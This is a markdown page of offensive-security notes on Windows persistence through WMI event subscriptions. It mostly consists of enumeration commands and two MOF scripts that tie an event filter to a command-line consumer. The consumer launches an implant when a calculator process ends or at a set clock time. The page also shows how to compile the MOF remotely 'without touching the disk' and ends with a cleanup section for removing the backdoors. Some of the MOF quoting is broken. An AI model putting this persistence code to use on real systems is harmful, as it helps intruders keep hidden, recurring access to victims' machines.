---
author(s):
  - Userware
tags:
  - post-exploitation
  - maintaining-access
  - persistence
  - living-off-the-land
  - T1084
  - windows
---
# Living off the Land

TODO: Consult cybereason blog post to replicate the attacks (refer to the links)

## 01 - Command Prompt

Query information about the namespaces for the WMI functions that will help us to make a persistence mechanism.

List the Root namespace

```
C:\> wmic.exe /namespace:\\root path __namespace
```

## 02 - PowerShell

Query information about the namespaces for the WMI functions that will help us to make a persistence mechanism.

List the Root namespace

```powershell
PS C:\> Get-CimClass

PS C:\> Get-CimClass -Namespace ROOT/CIMV2 | Where-Object CimClassName -like Win32*

PS C:\> Get-WmiObject -namespace "root" -class "__Namespace" | select Name

PS C:\> Get-CimInstance -namespace "root" -class "__Namespace" | Select-Object Name
```

List the names for the Subscription

```powershell
PS C:\> Get-WmiObject -Namespace root\Subscription -list

PS C:\> Get-CimInstance -Namespace root\Subscription -list
```

Display the information of the __EventFilter class and it's ability to trigger any `MSFT_SCMEventLogEvent`

```powershell
PS C:\> Get-WmiObject -Namespace root\Subscription -Class __EventFilter

PS C:\> Get-CimInstance -Namespace root\Subscription -Class __EventFilter
```

- Same thing with the __EventConsumer that has the `SCM Event Log Consumer` for an event that will happen

```powershell
PS C:\> Get-WmiObject -Namespace "root\Subscription" -Class __EventConsumer

PS C:\> Get-WmiObject -Namespace root\Subscription -Class __FilterToConsumerBinding
```

Spawn an implant when a program such as a calculator gets terminate if no process is present.

```
C:\> type wmievent.mof
#pragma namespace ("\\\\.\root\\subscription)

instance of CommandLineEventConsumer as $Cons {
    Name = "TestConsumer"
    CommandLineTemplate="C:\\path\\to\shell.exe";
};

Instance of __EventFilter as $Filt {
    Name = "TestFilter";
    Query = "Select * From __InstanceDeletionEvent WITHIN 5 "
            "Where TargetInstance ISA \ "Win32_Process\" "
            "AND TargetInstance.Name = \"win32calc.exe\"";
    QueryLanguage = "WQL";
    EventNamespace = "root\\subscription";
};

Instance of __FilterToConsumerBinding {
    Filter = $Filt;
    Consumer = $Cons;
}
```

Spawn an implant when a specific time has been reached.

```
C:\> type wmievent.mof
#pragma namespace ("\\\\.\root\\subscription)  
  
instance of CommandLineEventConsumer as $Cons {  
    Name = "TestConsumer"  
    CommandLineTemplate="C:\\path\\to\shell.exe";  
};  
  
Instance of __EventFilter as $Filt {  
    Name = "TestFilter";  
    Query = "Select * From __InstanceModificationEvent "  
            "Where TargetInstance ISA \ "Win32_LocalTime\" "  
            "AND TargetInstance.Hour = 1 "  
            "AND (TargetInstance.Minute = 24 "  
            "OR TargetInstance.Minute = 25 "  
            "OR TargetInstance.Minute = 26) "  
            "AND TargetInstance.Second = 30 ";  
    QueryLanguage = "WQL";  
    EventNamespace = "root\\cimv2";  
};  
  
Instance of __FilterToConsumerBinding {  
    Filter = $Filt;  
    Consumer = $Cons;  
}
```

Execute the MOF script.

```
C:\> mofcomp wmievent.mof
```

You can execute it remotely without touching the disk.

```
C:\> mofcomp -N \\<IP>\root\subscription wmievent.mof
```

### 2.1 - Clean up the backdoors

- Query the namespace for `__EventFilter`

```powershell
PS C:\> Get-WmiObject -namespace root\subscription -class __EventFilter

PS C:\> Get-CimInstance -namespace root\subscription -class __EventFilter
```

- Delete the name of the Filter

```
C:\> wmic /namespace:"\\root\subscription" path __EventFilter where name="TestFilter" delete
```

```powershell
PS C:\> Get-WmiObject -namespace root\subscription -class __EventFilter -Filter "Name='TestFilter'" | Remove-WMIObject -Verbose

PS C:\> Get-CimInstance -namespace root\subscription -class __EventFilter -Filter "Name='TestFilter'" | Remove-WMIObject -Verbose
```

- Query to double check if it's deleted

```powershell
PS C:\> Get-WmiObject -namespace root\subscription -class __EventFilter

PS C:\> Get-CimInstance -namespace root\subscription -class __EventFilter
```

- Delete the name of the Filter

```
C:\> wmic /namespace:"\\root\subscription" path __FilterToConsumerBinding where Filter="__EventFilter.Name='TestConsumer'" delete
```

TODO: Convert this to Get-CimInstance

```powershell
PS C:\> Get-WmiObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path like 'TestConsumer'" | Remove-WMIObject
```

---
## References

### LOFLCAB

- [LOFLCAB: WMIC](https://lofl-project.github.io/loflcab/Binaries/wmic/)

### Red Team Notes

- [Red Team Notes: Abusing Windows Managent Instrumentation](https://www.ired.team/offensive-security/persistence/t1084-abusing-windows-managent-instrumentation)

- [Red Team Notes: WMI as a Data Storage](https://www.ired.team/offensive-security/persistence/t1084-abusing-windows-managent-instrumentation/wmi-data-storage)

### Pentestlab

- [Pentestlab Blog: Persistence WMI Event Subscription](https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/)

- [Cybdefnp: Malware Persistence in WMI](https://cybdefnp.wordpress.com/2020/07/05/malware-persistence-in-wmi/)

- [PDQ: Powershell Guide Get-CimInstance and Get-WmiObject](https://www.pdq.com/blog/powershell-guide-get-ciminstance-and-get-wmiobject/)

- [in.security: An intro into abusing and identifying WMI Event Subscriptions for persistence](https://in.security/2019/04/03/an-intro-into-abusing-and-identifying-wmi-event-subscriptions-for-persistence/)

- [SS64: Get-CimInstance](https://ss64.com/ps/get-ciminstance.html)

- [FuzzySecurity: Windows Userland Persistence Fundamentals](https://fuzzysecurity.com/tutorials/19.html)